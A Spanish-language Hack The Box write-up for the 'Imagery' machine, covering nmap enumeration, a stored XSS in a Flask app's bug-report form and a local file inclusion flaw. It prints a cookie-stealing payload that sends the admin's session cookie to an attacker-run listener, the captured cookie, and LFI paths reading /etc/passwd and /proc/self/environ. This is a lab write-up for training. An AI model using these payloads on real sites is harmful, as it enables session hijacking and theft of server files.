---
layout: single
title: Imagery - Hack The Box
excerpt: "Imagery aloja una aplicación de galería de imágenes basada en Flask. Explotaremos una vulnerabilidad de XSS persistente (stored XSS) en la función de reporte de errores para robar una cookie de administrador."
date: 2026-02-19
classes: wide
header:
  teaser: /assets/images/htb-writeup-imagery/logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - linux
---

Imagery aloja una aplicación de galería de imágenes basada en Flask. Explotaremos una vulnerabilidad de XSS persistente (stored XSS) en la función de reporte de errores para robar una cookie de administrador.

# 1. Enumeracion

Con `nmap` buscare los pertos abiertos y escanear los servicios alojados

```
nmap -p- -vvv --min-rate 5000 10.129.242.164
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-19 14:46 -05
Initiating Ping Scan at 14:46
Scanning 10.129.242.164 [2 ports]
Completed Ping Scan at 14:46, 0.32s elapsed (1 total hosts)
Initiating Connect Scan at 14:46
Scanning imagery.htb (10.129.242.164) [65535 ports]
Discovered open port 22/tcp on 10.129.242.164
Completed Connect Scan at 14:46, 26.62s elapsed (65535 total ports)
Nmap scan report for imagery.htb (10.129.242.164)
Host is up, received conn-refused (0.17s latency).
Scanned at 2026-02-19 14:46:05 -05 for 27s
Not shown: 65465 filtered tcp ports (no-response)
PORT      STATE  SERVICE          REASON
22/tcp    open   ssh              syn-ack
8000/tcp  open   http-alt         syn-ack ttl 63

nmap -p 22,8000 -sCV 10.129.242.164
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-19 14:53 -05
Nmap scan report for imagery.htb (10.129.242.164)
Host is up (0.17s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open  http-alt Werkzeug/3.1.3 Python/3.12.7
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
```

El browser busca la IP registrada en el archivo local `/etc/hosts` y si no la encuentra busca en el servidor DNS, para eso agregamos la IP de la maquina en este archivo. 

```
echo "10.129.243.164 imagery.htb" | sudo tee -a /etc/hosts
```

![](/assets/images/htb-writeup-imagery/home.png)

Despues de navegar por las diferentes rutas, nos registramos en `http://imagery.htb:8000/register` y e ingresamos `http://imagery.htb:8000/login`

# 2. XSS 

Notamos que el formulario de tipo text area de la ruta `http://imagery.htb:8000/admin/bug_reports` es vulnerable a XSS el cual aprovecharemos para inyectar HTML y obtener la cookie del administrador. Una vez el admistrador atienda los reportes obtendremos su cookie de sesion.

Para eso desde nuentra maquina levantaremos en escucha un servidor en el puerto `8080`.

```
python -m http.server 8080
```
Enviaremos como parametro el siguiente HTML formulario Bug Details.

```html
<img src=/ onerror="document.location='http://{ip_atacante}:8080/'+document.cookie">
```

Si obtenemos el fetch  que envia el navegador, el payload final quedaria asi: 

```js
await fetch("http://imagery.htb:8000/report_bug", {
    "credentials": "include",
    "headers": {
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json",
    },
    "body": "{\"bugName\":\"test bug report\",\"bugDetails\":\"<img src=/ onerror=\\\"document.location='http://10.10.15.107:8080/'+document.cookie\\\">\"}",
    "method": "POST",
    "mode": "cors"
});
```
Cuando el administrador entre a ver el reporte, sera redirigido al host del atacante donde podra ver la su cookie de session.

```
python -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.242.164 - - [19/Feb/2026 16:46:11] code 404, message File not found
10.129.242.164 - - [19/Feb/2026 16:46:11] "GET /session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aZeEnw.GC9hjlqO-RnfgqivZOtmhF_yJKE HTTP/1.1" 404 -
10.129.242.164 - - [19/Feb/2026 16:46:11] code 404, message File not found
10.129.242.164 - - [19/Feb/2026 16:46:11] "GET /favicon.ico HTTP/1.1" 404 -
```

Al no tener la flag `HttpOnly` incluida en el encabezado `HTTP Set-Cookie` deja a la aplicación expuesta a ataques de **Cross-Site Scripting (XSS)** y secuestro de sesión. 

En consecuencia podremos entrar como administradores y seguir entendiendo como funciona esta APP Web. 

## 2.1 Secuestro de sesion

Procedemos a ir al strogange del browser donde encontraremos el valor de la cookie de sesion de nuentro ususario, si remplazamos la cookie nuestra por el del administrador accederemos a su usuario y podemos ver sus funciones

![](/assets/images/htb-writeup-imagery/secuestroSesion.png)

Al navegar como administradores podemos ver que tiene accesos a eliminar usuarios, descargar logs y ver los reportes de errores(*vualnerable a XSS*). 

Veamos una de las fetchs que envia el navegador:

```js
await fetch("http://imagery.htb:8000/admin/get_system_log?log_identifier=admin%40imagery.htb.log", {
    "credentials": "include",
    "headers": {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Upgrade-Insecure-Requests": "1",
    },
    "method": "GET",
    "mode": "cors"
});
```
# 3. LFI
Analicemos el **Path** `/get_system_log` este recurso accedido puede ser un file o un folder. Pero al ser una app web desarrollada con flask podemos intuir que es un metodo. Y su **Query scrign** envia el parametro `?log_identifier=admin%40imagery.htb.log` que podemos ver que es el nombre del log que intenta recuperar de la base de datos. 

En conlusion por medio de este metodo descarga un archivo. ¿Facil no?

Haremos **Web Fuzzing** al parametro `log_identifier` y veremos como se comporta la APP. Para eso podemos usar ZAP, Burpsuite, FFUF, Gobuster, entre otros. 

## 3.1 Web Fuzzing con Burp Suite
Usaremos Burb includer que es el web fuzzer de Burp. 

Configurado con: 
- **sniper attack** 
- **payload type**: Simple list 
- **wordlist**: [SecList/Fuzzing/LFI/LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)

Encontramos que podemos descargar y ver los directorios estandares del sistema.

- `/etc`: El directorio de archivos de configuración del sistema local. Donde tambien se encontran los archivos de configuración para las aplicaciones instaladas.
  - /etc/passwd 
  - /etc/hosts
  - /etc/crontab
  - /etc/grup

  ![](/assets/images/htb-writeup-imagery/lfi-etc.png)

- `/proc`: Es un archivo "virtual" que solo existe en la memoria mientras el sistema corre. Donde muestra las variables de entorno del proceso que se está ejecutando actualmente.
  - /proc/self/environ

  ![](/assets/images/htb-writeup-imagery/lfi-proc.png)

Notamos que exite un grupo llamado `web:x:1001:` y una variable de entorno llamada `HOME=/home/web`.

## 3.2 Codigo fuente

La estructura de un proyecto en **Flask** puede variar desde un único archivo hasta una arquitectura modular compleja, dependiendo de la escala de la aplicación. Una basica constata de la siguiente:

```
mi_proyecto/
├── app.py              # Lógica principal, rutas y configuración
├── static/             # Archivos CSS, JS e imágenes
│   └── css/style.css
├── templates/          # Archivos HTML (Jinja2)
│   └── index.html
├── venv/               # Entorno virtual (muy recomendado)
└── requirements.txt    # Dependencias del proyecto
```
Procedemos a descargar por medio del path `/admin/get_system_log?log_identifier=/home/web/web/app.py` el codigo fuente principal de la APP Web y los archivos que la componen.

```py
from flask import Flask, render_template
import os
import sys
from datetime import datetime
from config import *
from utils import _load_data, _save_data
from utils import *
from api_auth import bp_auth
from api_upload import bp_upload
from api_manage import bp_manage
from api_edit import bp_edit
from api_admin import bp_admin
from api_misc import bp_misc

app_core = Flask(__name__)
app_core.secret_key = os.urandom(24).hex()
app_core.config['SESSION_COOKIE_HTTPONLY'] = False
```

```py
@app_core.route('/')
def main_dashboard():
    return render_template('index.html')

if __name__ == '__main__':
    current_database_data = _load_data()
    default_collections = ['My Images', 'Unsorted', 'Converted', 'Transformed']
    existing_collection_names_in_database = {g['name'] for g in current_database_data.get('image_collections', [])}
    for collection_to_add in default_collections:
        if collection_to_add not in existing_collection_names_in_database:
            current_database_data.setdefault('image_collections', []).append({'name': collection_to_add})
    _save_data(current_database_data)
    for user_entry in current_database_data.get('users', []):
        user_log_file_path = os.path.join(SYSTEM_LOG_FOLDER, f"{user_entry['username']}.log")
        if not os.path.exists(user_log_file_path):
            with open(user_log_file_path, 'w') as f:
                f.write(f"[{datetime.now().isoformat()}] Log file created for {user_entry['username']}.\n")
    port = int(os.environ.get("PORT", 8000))
    if port in BLOCKED_APP_PORTS:
        print(f"Port {port} is blocked for security reasons. Please choose another port.")
        sys.exit(1)
    app_core.run(debug=False, host='0.0.0.0', port=port)


```